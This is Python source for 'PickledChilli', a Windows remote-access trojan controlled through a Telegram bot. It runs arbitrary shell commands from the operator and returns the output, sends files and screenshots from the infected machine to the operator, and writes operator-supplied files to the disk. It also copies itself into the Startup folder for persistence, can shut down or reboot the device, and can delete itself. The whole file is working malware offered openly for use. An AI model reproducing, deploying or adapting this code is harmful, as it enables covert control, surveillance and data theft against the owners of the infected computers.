import sys
import os
import subprocess
import telebot
from PIL import ImageGrab


token = ''  # Token from BotFather
administrator = ''  # User ID
bot = telebot.TeleBot(token)

path = f'"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\PickledChilli.py"'  # path for AUTORUN
help = '''
Commands

help$ - all commands
cmd$ - command line interpreter. write a command after "$"
poweroff$ - turn off device
reboot$ - reboot a device
screenshot$ - take a screenshot
cd$ - change directory. write parameter after "$"
download$ - download. write the path after "$"
autorun$ - put in autorun
delautorun$ - remove from autorun
suicide$ - delete bot from device
Use 📎 to upload a file
\n_______\nPickled🌶Chilli   by StripedBear
'''


@bot.message_handler(content_types=['text'])
def main(message):
    menu = {
        'cmd': cmd,
        'poweroff': power_off,
        'reboot': reboot,
        'screenshot': screenshot,
        'cd': cd,
        'download': file_download,
        'autorun': autorun,
        'delautorun': autorun_del,
        'suicide': self_destruction,
        'help': help_command,
        }
    try:
        command, param = message.text.lower().split('$')
        menu[command](param) if param else menu[command]()
        if command not in ['poweroff', 'reboot', 'help']:
            bot.send_message(administrator, 'Done! Ready for next command!')
    except Exception:
        bot.send_message(administrator, "Something goes wrong 😢 Check the command")


@bot.message_handler(content_types=['document'])
def file_upload(message):
    try:
        with open('C:\\' + message.document.file_name, 'wb') as file:
            file.write(bot.download_file(bot.get_file(message.document.file_id).file_path))
        bot.send_message(administrator, f'C:\\{message.document.file_name}\nDone!')
    except Exception as e:
        bot.send_message(administrator, f"Something goes wrong 😢 {e}")


def cmd(param):
    if callback := subprocess.check_output(param, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL):
        bot.send_message(administrator, callback)


def cd(param):
    os.chdir(param)
    cmd('cd')


def autorun():
    if not os.path.exists(path):
        subprocess.check_output(f'copy {sys.argv[0]} {path}', shell=True)


def autorun_del():
    cmd('del ' + path + '/q')


def file_download(param):
    bot.send_message(administrator, 'Downloading...')
    file = open(param, 'rb')
    bot.send_document(administrator, file, timeout=60)


def reboot():
    bot.send_message(administrator, 'Device reboot...')
    os.system('shutdown -r /t 0')


def power_off():
    bot.send_message(administrator, 'Turning off the device...')
    os.system('shutdown -s /t 0 /f')


def screenshot():
    bot.send_message(administrator, 'Taking screenshot...')
    scr_path = 'C:\\Sсreenshot.jpg'
    ImageGrab.grab().save(scr_path)
    with open(scr_path, 'rb') as file:
        bot.send_photo(administrator, file)
    os.remove(scr_path)


def self_destruction():
    bot.send_message(administrator, "🌶")
    os.remove(sys.argv[0])


def help_command():
    bot.send_message(administrator, help)


if __name__ == '__main__':
    try:
        bot.send_message(administrator, 'Device is connected!')
        bot.polling(none_stop=False)
    except Exception as e:
        sys.exit()